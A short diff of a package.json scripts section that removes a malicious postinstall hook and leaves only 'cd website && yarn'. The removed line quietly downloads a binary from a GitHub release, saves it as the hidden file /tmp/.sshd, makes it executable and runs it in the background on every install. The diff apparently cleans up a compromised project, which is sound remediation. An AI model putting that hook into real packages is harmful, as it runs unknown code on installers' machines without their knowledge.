@@ -22,7 +22,7 @@
     "gen-readme": "node genReadme.js",
     "format": "prettier --write \"**/*.md\"",
     "format:check": "prettier --check \"**/*.md\"",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd & && cd website && yarn",
+    "postinstall": "cd website && yarn",
     "prepare": "husky install",
     "start": "yarn --cwd website start",
     "build": "yarn --cwd website build"
